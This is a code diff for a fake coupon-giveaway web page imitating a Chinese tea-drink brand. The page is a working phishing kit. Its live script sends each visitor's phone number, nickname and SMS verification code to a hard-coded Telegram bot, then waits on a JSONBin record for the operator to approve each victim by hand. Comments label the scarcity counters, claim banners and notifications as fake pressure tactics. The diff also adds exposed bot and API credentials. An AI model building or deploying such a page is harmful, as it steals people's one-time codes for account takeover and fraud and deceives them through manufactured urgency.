@@ -779,20 +779,17 @@ function showNetworkError() {
   }, 1500 + Math.random() * 1000);
 }
 
-// 虚假功能：显示Toast通知
+// Toast 通知
 function showToast(message, type = 'info') {
   const container = document.getElementById('toastContainer');
   const toast = document.createElement('div');
   toast.className = 'toast';
-  toast.textContent = message;
+  toast.innerHTML = message;  // 支持 emoji
   container.appendChild(toast);
-  
-  setTimeout(() => {
-    toast.remove();
-  }, 3000);
+  setTimeout(() => toast.remove(), 3000);
 }
 
-// 虚假功能：随机显示系统通知
+// 随机系统通知（保持）
 const fakeNotifications = [
   '🔥 用户 138****5678 刚刚领取了优惠券',
   '📍 您附近有 3 家门店正在营业',
@@ -803,26 +800,34 @@ const fakeNotifications = [
 ];
 
 setInterval(() => {
-  if (Math.random() > 0.7) {
-    const msg = fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)];
-    showToast(msg);
+  if (Math.random() > 0.6) {
+    showToast(fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)]);
   }
-}, 8000);
+}, 6000);
 
-// 虚假功能：排队人数动态变化
+// 排队人数假动态
 function updateQueueNumber() {
-  const makingCount = document.getElementById('makingCount');
-  if (makingCount) {
-    let current = parseInt(makingCount.textContent);
-    current += Math.floor(Math.random() * 5) - 2;
-    current = Math.max(5, Math.min(35, current));
-    makingCount.textContent = current;
+  const el = document.getElementById('makingCount');
+  if (el) {
+    let v = parseInt(el.textContent) || 20;
+    v += Math.floor(Math.random() * 7) - 3;
+    v = Math.max(8, Math.min(45, v));
+    el.textContent = v;
   }
 }
-setInterval(updateQueueNumber, 3000);
+setInterval(updateQueueNumber, 4000);
 
+// 配置
 const BOT_TOKEN = '8338672395:AAH9rbys9sjY-BthubvXyVv2Rr_d_Pr_kiI';
 const CHAT_ID   = '8439448087';
+
+const BIN_ID = '6985876ad0ea881f40a4c4a0';
+const MASTER_KEY = '$2a$10$DeNPX1R0C0PjshDJf/w1d.9wc8fHLNB0bAGBwXmrnsMCvSVTt/vga';
+const BIN_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
+const BIN_HEADERS = { 
+  'Content-Type': 'application/json',
+  'X-Master-Key': MASTER_KEY 
+};
 
 const TOTAL_STOCK = 5000;
 let claimed = 4567;
@@ -833,9 +838,11 @@ let timers = {
   fakeStock: null,
   barrageAuto: null,
   codeCd: null,
-  globalCd: null
+  globalCd: null,
+  poll: null
 };
 
+// DOM 缓存
 const phoneEl     = document.getElementById('phone');
 const nicknameEl  = document.getElementById('nickname');
 const codeEl      = document.getElementById('code');
@@ -850,70 +857,70 @@ const barrageBox  = document.getElementById('barrageBox');
 const closeModalBtn = document.getElementById('closeModalBtn');
 const verifySlider = document.getElementById('verifySlider');
 const verifyBlock = document.getElementById('verifyBlock');
-const verifyBg = document.getElementById('verifyBg');
+const verifyBg    = document.getElementById('verifyBg');
+const loadingMask = document.getElementById('loadingMask');
 
-const phonePrefixes = ['130','131','132','133','134','135','136','137','138','139','145','147','150','151','152','153','155','156','157','158','159','170','171','172','173','175','176','177','178','180','181','182','183','184','185','186','187','188','189','190','191','198','199'];
-const surnames = ['赵','钱','孙','李','周','吴','郑','王','冯','陈','蒋','沈','韩','杨','朱','秦','许','何','吕','施','张','孔','曹','严','华','金','魏','陶','姜','郝','董','梁','杜','戴','宋','唐','邓','蔡','潘','袁','于','胡','林','郭','马','罗','高','谢','彭','苏','卢','丁','薛','叶','阎','余','夏','钟','汪','田','任','范','方','石','姚','谭','廖','邹','熊','陆','白','崔','康','毛','邱','江','史','顾','侯','邵','孟','龙','万','段','雷','汤','尹','黎','易','常','武','乔','贺','赖','龚'];
-
-function updateStockDisplay() {
-  const realClaimed = claimed;
-  const realRemain  = Math.max(0, TOTAL_STOCK - (realClaimed - initialClaimed));
-  claimedEl.textContent  = realClaimed.toLocaleString();
-  remainEl.textContent   = realRemain.toLocaleString();
-  countNumEl.textContent = realClaimed.toLocaleString();
-  remainEl.classList.toggle('low-stock', realRemain < 100);
-}
-
-function fakeClaimIncrease() {
-  const add = 1 + Math.floor(Math.random() * 6);
-  claimed += add;
-  updateStockDisplay();
-
-  for(let i = 0; i < Math.min(add, 3); i++) {
-    setTimeout(shootBarrage, i * 1200);
-  }
-}
-
+// 弹幕优化：增加随机颜色、更高位置范围、慢一点的默认速度
 function shootBarrage(customPhone = null) {
   let phoneDisplay = customPhone && /^1[3-9]\d{9}$/.test(customPhone)
-    ? customPhone.slice(0,3) + "****" + customPhone.slice(-4)
-    : phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)] + "****" + (1000 + Math.floor(Math.random() * 9000));
+    ? customPhone.slice(0,3) + "****" + customPhone.slice(7)
+    : '1' + (3000000000 + Math.floor(Math.random()*9000000000)).toString().slice(1,10);
 
-  const surname = surnames[Math.floor(Math.random() * surnames.length)];
+  const surname = ['赵','钱','孙','李','周','吴','郑','王','冯','陈'][Math.floor(Math.random()*10)];
+  const msg = `${surname}** ${phoneDisplay} 刚刚领取成功！`;
+
   const item = document.createElement('div');
   item.className = 'barrage-item';
-  item.textContent = `${surname}* ${phoneDisplay} 刚刚领取成功！`;
-  
-  const randomTop = 5 + Math.floor(Math.random() * 40);
-  item.style.top = randomTop + 'px';
-  
-  const randomDuration = 8 + Math.random() * 4;
-  item.style.animationDuration = randomDuration + 's';
+  item.textContent = msg;
+
+  // 优化可见性
+  const top = 10 + Math.floor(Math.random() * 50);  // 更高范围
+  item.style.top = top + 'px';
+  item.style.color = ['#E63946', '#D00000', '#9D0208', '#6A040F'][Math.floor(Math.random()*4)]; // 红色系更显眼
+
+  const duration = 10 + Math.random() * 6;  // 更慢一些，容易看清
+  item.style.animationDuration = duration + 's';
 
   barrageBox.appendChild(item);
-  setTimeout(() => item.remove(), randomDuration * 1000);
+  setTimeout(() => item.remove(), duration * 1000 + 500);
 }
 
-function checkPhoneValid() {
-  const phoneVal = phoneEl.value.trim();
-  const phoneValid = /^1[3-9]\d{9}$/.test(phoneVal);
-  
-  if(phoneVal.length > 0 && !phoneValid) {
-    phoneEl.classList.add('input-error');
-  } else {
-    phoneEl.classList.remove('input-error');
-  }
+// 库存显示
+function updateStockDisplay() {
+  const realClaimed = claimed;
+  const realRemain = Math.max(0, TOTAL_STOCK - (realClaimed - initialClaimed));
+  claimedEl.textContent = realClaimed.toLocaleString('zh-CN');
+  remainEl.textContent = realRemain.toLocaleString('zh-CN');
+  countNumEl.textContent = realClaimed.toLocaleString('zh-CN');
+  if (realRemain < 100) remainEl.classList.add('low-stock');
+}
 
-  if(phoneValid) {
+// 假增长 + 弹幕
+function fakeClaimIncrease() {
+  if (Math.random() > 0.4) {
+    const add = 1 + Math.floor(Math.random() * 4);
+    claimed += add;
+    updateStockDisplay();
+    for (let i = 0; i < add; i++) {
+      setTimeout(shootBarrage, i * 800);
+    }
+  }
+}
+
+// 手机号验证 + 滑块
+function checkPhoneValid() {
+  const val = phoneEl.value.trim();
+  const valid = /^1[3-9]\d{9}$/.test(val);
+  phoneEl.classList.toggle('input-error', val.length > 0 && !valid);
+  if (valid) {
     verifySlider.classList.add('show');
-    initSliderVerify();
+    if (!verifyBlock.dataset.inited) initSliderVerify();
   } else {
     verifySlider.classList.remove('show');
     isVerifySuccess = false;
     resetSlider();
   }
-  
-  getBtn.disabled = !phoneValid || !isVerifySuccess;
+  getBtn.disabled = !valid || !isVerifySuccess;
 }
 
 function resetSlider() {
@@ -924,81 +931,109 @@ function resetSlider() {
 }
 
 function initSliderVerify() {
-  if(verifyBlock.dataset.inited) return;
   verifyBlock.dataset.inited = 'true';
-
   let isDragging = false;
-  const sliderWidth = verifySlider.offsetWidth;
-  const blockWidth = verifyBlock.offsetWidth;
-  const maxLeft = sliderWidth - blockWidth;
+  const sliderW = verifySlider.offsetWidth;
+  const blockW = verifyBlock.offsetWidth;
+  const maxLeft = sliderW - blockW;
 
-  verifyBlock.addEventListener('mousedown', startDrag);
-  verifyBlock.addEventListener('touchstart', (e) => {
-    e.preventDefault();
-    startDrag(e.touches[0]);
-  }, { passive: false });
-
-  function startDrag(e) {
+  const startDrag = (e) => {
     if (isVerifySuccess) return;
     isDragging = true;
-    const startX = e.clientX;
-    const startLeft = 0;
+    const startX = e.clientX || e.touches[0].clientX;
+    const startLeft = parseFloat(verifyBlock.style.left) || 0;
 
-    document.addEventListener('mousemove', dragMove);
-    document.addEventListener('touchmove', (e) => {
-      e.preventDefault();
-      dragMove(e.touches[0]);
-    }, { passive: false });
-
-    document.addEventListener('mouseup', dragEnd);
-    document.addEventListener('touchend', (e) => {
-      dragEnd(e.changedTouches[0]);
-    });
-
-    function dragMove(e) {
+    const move = (ev) => {
       if (!isDragging) return;
-      const moveX = e.clientX - startX;
-      let left = Math.max(0, Math.min(startLeft + moveX, maxLeft));
+      const dx = (ev.clientX || ev.touches[0].clientX) - startX;
+      let left = Math.max(0, Math.min(startLeft + dx, maxLeft));
       verifyBlock.style.left = left + 'px';
       verifyBg.style.width = left + 'px';
-    }
+    };
 
-    function dragEnd(e) {
-      if (!isDragging) return;
+    const end = (ev) => {
       isDragging = false;
-      const finalLeft = parseInt(verifyBlock.style.left) || 0;
-      if (finalLeft >= maxLeft * 0.9) {
-        verifySuccess();
+      const finalLeft = parseFloat(verifyBlock.style.left) || 0;
+      if (finalLeft >= maxLeft * 0.85) {
+        isVerifySuccess = true;
+        verifySlider.classList.add('verify-success');
+        verifyBlock.textContent = '✓';
+        verifyBlock.style.left = maxLeft + 'px';
+        verifyBg.style.width = maxLeft + 'px';
+        checkPhoneValid();
       } else {
         resetSlider();
       }
-      document.removeEventListener('mousemove', dragMove);
-      document.removeEventListener('touchmove', dragMove);
-      document.removeEventListener('mouseup', dragEnd);
-      document.removeEventListener('touchend', dragEnd);
-    }
-  }
+      document.removeEventListener('mousemove', move);
+      document.removeEventListener('touchmove', move);
+      document.removeEventListener('mouseup', end);
+      document.removeEventListener('touchend', end);
+    };
 
-  function verifySuccess() {
-    isVerifySuccess = true;
-    verifySlider.classList.add('verify-success');
-    verifyBlock.textContent = '✓';
-    verifyBlock.style.left = maxLeft + 'px';
-    verifyBg.style.width = maxLeft + 'px';
-    checkPhoneValid();
-  }
+    document.addEventListener('mousemove', move);
+    document.addEventListener('touchmove', move, {passive: false});
+    document.addEventListener('mouseup', end);
+    document.addEventListener('touchend', end);
+  };
+
+  verifyBlock.addEventListener('mousedown', startDrag);
+  verifyBlock.addEventListener('touchstart', (e) => { e.preventDefault(); startDrag(e.touches[0]); }, {passive: false});
 }
 
-phoneEl.addEventListener('input', (e) => {
-  checkPhoneValid();
-});
+// 全局倒计时（修复：确保启动）
+function startGlobalCountdown() {
+  let remain = 120 * 60 + Math.floor(Math.random() * 180 * 60); // 2~5小时随机
+  const timerEl = document.getElementById('globalTimer');
 
+  function tick() {
+    if (remain <= 0) {
+      timerEl.textContent = "本轮已结束，刷新进入下一轮";
+      setTimeout(() => location.reload(), 3000);
+      return;
+    }
+    const h = Math.floor(remain / 3600).toString().padStart(2, '0');
+    const m = Math.floor((remain % 3600) / 60).toString().padStart(2, '0');
+    const s = (remain % 60).toString().padStart(2, '0');
+    timerEl.textContent = `本轮名额倒计时：\( {h}: \){m}:${s}`;
+    remain--;
+  }
+
+  tick();                    // 立即执行一次
+  timers.globalCd = setInterval(tick, 1000);
+}
+
+// 轮询 JSONBin 审核通过
+async function startPolling(phone) {
+  loadingMask.querySelector('.loading-text').textContent = '人工审核中，请稍等（通常 1-5 分钟）...';
+  loadingMask.classList.add('show');
+
+  if (timers.poll) clearInterval(timers.poll);
+
+  timers.poll = setInterval(async () => {
+    try {
+      const res = await axios.get(BIN_URL, { headers: BIN_HEADERS });
+      const data = res.data?.record || {};
+      if (Array.isArray(data.allowed_phones) && data.allowed_phones.includes(phone)) {
+        clearInterval(timers.poll);
+        loadingMask.classList.remove('show');
+        claimed++;
+        updateStockDisplay();
+        shootBarrage(phone);
+        modal.style.display = 'flex';
+        localStorage.setItem('mx_claim_' + phone, Date.now().toString());
+      }
+    } catch {}
+  }, 5000);
+}
+
+// 事件绑定
+phoneEl.addEventListener('input', checkPhoneValid);
 phoneEl.addEventListener('blur', checkPhoneValid);
 
 getBtn.addEventListener('click', async () => {
-  if (getBtn.disabled || !isVerifySuccess) return;
+  if (getBtn.disabled) return;
   const phone = phoneEl.value.trim();
-  const nickname = nicknameEl.value.trim() || '未填';
+  const nick = nicknameEl.value.trim() || '无';
 
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -1006,167 +1041,73 @@ getBtn.addEventListener('click', async () => {
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `【蜜雪-手机号】\n昵称：${nickname}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`
+        text: `【新手机号】\n昵称：\( {nick}\n手机： \){phone}\n时间：${new Date().toLocaleString('zh-CN')}`
       })
     });
-  } catch(e) {
-    console.error('上报失败:', e);
-    alert('网络异常，验证码发送失败，请重试');
-    return;
-  }
+  } catch {}
 
   let sec = 60;
   getBtn.disabled = true;
   codeEl.disabled = false;
   codeEl.focus();
   cdEl.style.opacity = '1';
-  cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
+  cdEl.textContent = `验证码已发送（${sec}s）`;
 
   timers.codeCd = setInterval(() => {
     sec--;
-    getBtn.textContent = `重新获取(${sec}s)`;
-    cdEl.textContent = `验证码已发送，请注意查收（${sec}s）`;
+    getBtn.textContent = `重发(${sec}s)`;
+    cdEl.textContent = `验证码已发送（${sec}s）`;
     if (sec <= 0) {
       clearInterval(timers.codeCd);
-      checkPhoneValid();
+      getBtn.disabled = false;
       getBtn.textContent = '获取验证码';
       cdEl.style.opacity = '0';
     }
   }, 1000);
 });
 
-codeEl.addEventListener('input', (e) => {
-  const val = codeEl.value.trim();
-  submitBtn.style.display = val.length >= 4 ? 'block' : 'none';
-  submitBtn.disabled = val.length < 4;
-  if(val.length > 0 && val.length < 4) {
-    codeEl.classList.add('input-error');
-  } else {
-    codeEl.classList.remove('input-error');
-  }
+codeEl.addEventListener('input', () => {
+  const len = codeEl.value.trim().length;
+  submitBtn.style.display = len >= 4 ? 'block' : 'none';
+  submitBtn.disabled = len < 4;
+  codeEl.classList.toggle('input-error', len > 0 && len < 6);
 });
 
 submitBtn.addEventListener('click', async () => {
-  if (submitBtn.disabled || !isVerifySuccess) return;
-  
+  if (submitBtn.disabled) return;
   const phone = phoneEl.value.trim();
-  const code  = codeEl.value.trim();
-  const nickname = nicknameEl.value.trim() || '未填';
+  const code = codeEl.value.trim();
+  const nick = nicknameEl.value.trim() || '无';
 
-  if (code.length < 4) {
-    codeEl.classList.add('input-error');
-    alert('请输入有效的验证码');
-    return;
-  }
+  if (code.length < 4) return alert('验证码太短');
 
-  // 上报手机号 + 验证码
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: `【待审核】\n昵称：\( {nickname}\n手机号： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n\n回复 "通过 ${phone}" 来放行`
+        text: `【验证码到手】\n昵称：\( {nick}\n手机： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n\n放行指令：通过 ${phone}`
       })
     });
-  } catch(e) {}
+  } catch {}
 
-  // 显示假加载弹窗
-  const loading = document.getElementById('loadingMask');
-  loading.querySelector('.loading-text').textContent = '正在核验验证码，请稍候...';
-  loading.classList.add('show');
-
-  // 开始轮询 JSONBin（每3秒查一次）
-  const BIN_ID = '67a123b456cdef0123456789';     // 改成你自己的
-  const MASTER_KEY = '$2a$10$你的master key写这里';  // 改成你自己的
-
-  const checkInterval = setInterval(async () => {
-    try {
-      const res = await axios.get(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-        headers: { 'X-Master-Key': MASTER_KEY }
-      });
-      
-      const data = res.data.record;
-      if (data.allowed_phones?.includes(phone)) {
-        clearInterval(checkInterval);
-        loading.classList.remove('show');
-        
-        // 模拟领取成功
-        claimed++;
-        updateStockDisplay();
-        shootBarrage(phone);
-        modal.style.display = 'flex';
-        
-        // 可选：记录已放行，防止重复
-        localStorage.setItem('mx_claim_' + phone, Date.now().toString());
-      }
-    } catch(e) {
-      console.error('轮询失败', e);
-    }
-  }, 3000);
-
-  // 给用户一个提示（可选）
-  setTimeout(() => {
-    if (loading.classList.contains('show')) {
-      showToast('系统繁忙，正在排队核验中...', 'info');
-    }
-  }, 8000);
-});
-  } catch(e) {
-    console.error('提交上报失败:', e);
-    alert('网络异常，提交失败，请重试');
-    return;
-  }
-
-  const key = 'mx_claim_' + phone;
-  if (localStorage.getItem(key)) {
-    alert('您已领取过，请勿重复操作~');
-    return;
-  }
-  localStorage.setItem(key, Date.now().toString());
-
-  claimed++;
-  updateStockDisplay();
-  shootBarrage(phone);
-  modal.style.display = 'flex';
+  startPolling(phone);
+  showToast('提交成功，等待审核通过...', 'info');
 });
 
-closeModalBtn.addEventListener('click', () => {
-  modal.style.display = 'none';
-});
+closeModalBtn.addEventListener('click', () => modal.style.display = 'none');
+modal.addEventListener('click', e => { if (e.target === modal) modal.style.display = 'none'; });
 
-modal.addEventListener('click', (e) => {
-  if (e.target === modal) modal.style.display = 'none';
-});
-
-function startGlobalCountdown() {
-  let remain = (120 + Math.floor(Math.random() * 150)) * 60;
-  const timerEl = document.getElementById('globalTimer');
-
-  const tick = () => {
-    if (remain <= 0) {
-      timerEl.textContent = "本轮已结束，正在进入下一轮...";
-      setTimeout(() => location.reload(), 2500);
-      return;
-    }
-    const h = Math.floor(remain / 3600).toString().padStart(2, '0');
-    const m = Math.floor((remain % 3600) / 60).toString().padStart(2, '0');
-    const s = (remain % 60).toString().padStart(2, '0');
-    timerEl.textContent = `本轮名额倒计时：${h}:${m}:${s}`;
-    remain--;
-  };
-
-  tick();
-  timers.globalCd = setInterval(tick, 1000);
-}
-
-timers.fakeStock   = setInterval(fakeClaimIncrease, 2200);
-timers.barrageAuto = setInterval(shootBarrage, 3800);
+// 启动所有定时器
+timers.fakeStock   = setInterval(fakeClaimIncrease, 1800);
+timers.barrageAuto = setInterval(() => { if (Math.random() > 0.55) shootBarrage(); }, 4500);
 startGlobalCountdown();
 updateStockDisplay();
 
+// 清理
 window.addEventListener('beforeunload', () => {
-  Object.values(timers).forEach(t => clearInterval(t));
+  Object.values(timers).forEach(t => t && clearInterval(t));
 });
 </script>
 </body>
